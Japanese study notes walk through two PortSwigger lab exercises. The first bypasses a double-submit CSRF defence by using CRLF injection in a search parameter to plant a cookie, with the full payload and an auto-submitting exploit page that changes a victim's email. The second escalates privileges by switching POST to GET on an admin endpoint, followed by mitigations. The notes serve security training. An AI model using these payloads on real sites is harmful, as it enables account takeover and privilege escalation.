
## ラボの詳細手順

### Step 1: アカウントにログインして動作確認

1. ラボを開始して、Burp Suiteのブラウザを起動
2. 認証情報でログイン: `wiener:peter`
3. "Update email"機能に移動

### Step 2: 正常なリクエストをキャプチャ

1. メールアドレスを変更（例: `test@test.com`）して送信
2. Burp Proxy → HTTP historyで該当リクエストを探す
3. リクエストは大体こんな感じ：

```http
POST /my-account/change-email HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=xxxxx; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
```

### Step 3: Double Submit防御を確認

1. このリクエストを右クリック → "Send to Repeater"
2. Repeaterで以下をテスト：

**テスト1: CSRFトークンを変更**
```http
email=test@test.com&csrf=DIFFERENT_VALUE
```
→ エラーになるはず

**テスト2: Cookie と パラメータを同じ偽物に変更**
```http
Cookie: session=xxxxx; csrf=fake123
...
email=test@test.com&csrf=fake123
```
→ **成功する！** これがdouble submitの脆弱性や

### Step 4: Cookie注入ポイントを探す

1. サイト内で検索機能を探す（大体トップページにある）
2. 適当に検索: `test`
3. レスポンスを見る：

```http
HTTP/1.1 200 OK
Set-Cookie: Last-Search=test
...
```

検索語が反映されてる！

4. CRLFインジェクションを試す：
```
/?search=test%0d%0aSet-Cookie:%20csrf=fake
```

5. レスポンスを確認：
```http
HTTP/1.1 200 OK
Set-Cookie: Last-Search=test
Set-Cookie: csrf=fake
```

**注入成功！** `%0d%0a`で改行してSet-Cookieヘッダーを追加できた

### Step 5: SameSite属性を追加

クロスサイトでもcookieが送信されるように`SameSite=None`を追加：

```
/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```

（`%3b` = セミコロン`;`）

### Step 6: エクスプロイトを作成

1. Burp → "Go to exploit server"
2. Bodyに以下のHTMLを記述：

```html
<html>
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@evil.com" />
      <input type="hidden" name="csrf" value="fake" />
    </form>
    
    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();" />
  </body>
</html>
```

**重要ポイント:**
- `action`のURLは自分のラボIDに変更
- `email`は自分のメールアドレスと**違う**ものに
- `csrf`値は`fake`で統一（cookieとパラメータで同じ値）
- `img`の`src`も自分のラボIDに変更

### Step 7: テスト

1. "Store"ボタンでエクスプロイトを保存
2. "View exploit"で自分でテスト
   - 自分のメールアドレスが変わるはず
   - 変わったら成功！

### Step 8: 攻撃実行

1. 自分のアカウントでメールアドレスを元に戻す
2. "Deliver to victim"をクリック
3. ラボが解決される！

## 動作の詳細フロー

```
1. 被害者がエクスプロイトページを開く
   ↓
2. <img>タグが読み込まれる
   GET /?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
   ↓
3. レスポンスでcookieが設定される
   Set-Cookie: csrf=fake; SameSite=None
   ↓
4. 画像が存在しない → onerrorイベント発火
   ↓
5. document.forms[0].submit() でフォームが自動送信
   POST /my-account/change-email
   Cookie: csrf=fake
   Body: email=hacker@evil.com&csrf=fake
   ↓
6. サーバーがチェック
   Cookie csrf == Body csrf ? → fake == fake → OK!
   ↓
7. メールアドレス変更成功
```

---
HTTPメソッドでアクセス制御をすり抜ける脆弱性

## どんな脆弱性？

「メソッドベースのアクセス制御バイパス」 や 「HTTPバーブタンパリング」 って呼ばれる脆弱性。

超シンプルに言うと：

サーバーが「POSTはダメ」ってチェックしてるのに、GETは見てへんかった

## どう気づく？（攻撃者視点）

ポイントはこの2ステップの気づき：

気づき①「管理者機能のエンドポイントが分かった」

管理者でログインしてUpgrade操作したら /admin-roles に username=wiener&action=upgrade を送ってるのが見えた。

→「このエンドポイントに直接リクエスト投げたらどうなる？」

気づき②「POSTは弾かれたけど、GETは試してへん」

一般ユーザーのセッションでPOSTしたら 401 Unauthorized。

→「メソッドを変えたらどうなる？」←ここが発想のキモ

GETに変えると、パラメータはURLのクエリストリングに移動する：

POST /admin-roles        →  GET /admin-roles?username=wiener&action=upgrade
body: username=wiener...     (bodyなし)


これを送ったら 302 Found（成功）→ 穴発見。

なぜ通った？（サーバー側で何が起きてたか）

サーバーの実装がこんな感じになってた（イメージ）：

# 🔴 ダメな実装
if request.method == "POST" and path == "/admin-roles":
    if not is_admin(session):
        return 401  # POSTだけチェック
    do_upgrade(username)

# GETの場合はこのチェックを通らないまま処理される
if path == "/admin-roles":
    username = request.GET.get("username")
    do_upgrade(username)  # ← チェックなしで実行される！


つまり 「POSTだけ見張って、GETは素通りさせてた」 状態。

## 攻撃の流れ（まとめ）

①管理者セッションでリクエストの形を把握（偵察）
         ↓
②一般ユーザーのセッションでPOST → 401（壁を確認）
         ↓
③GETに変換して送る → 302（壁に穴を発見）
         ↓
④一般ユーザーが管理者に昇格（権限昇格成功）


## どう対策するか

✅ 正しい対策

「メソッドに関係なく、エンドポイントへのアクセス自体を制御する」

# 🟢 正しい実装
if path == "/admin-roles":
    if not is_admin(session):  # メソッド問わずここで弾く
        return 401
    
    # POSTかGETかに関係なくパラメータ取得
    username = request.POST.get("username") or request.GET.get("username")
    do_upgrade(username)


他にも：



|対策                 |内容                                        |
|-------------------|------------------------------------------|
|**エンドポイント単位で認可**   |メソッドではなく「このURLは管理者のみ」と定義                  |
|**GETで状態変更しない**    |変更系の操作はPOST/PUT/DELETEのみに限定（REST原則）       |
|**フレームワークの認可機能を使う**|自前チェックより Spring Security や Django の権限管理を使う|

一言でまとめると

「POST はチェックしたけど GET は忘れてた」 という実装ミスを、メソッド変換でつついた攻撃。

認可チェックは 「どのメソッドか」じゃなく「誰が何にアクセスするか」 で判断せなあかん、というのがこのラボの教訓やで。​​​​​​​​​​​​​​​​
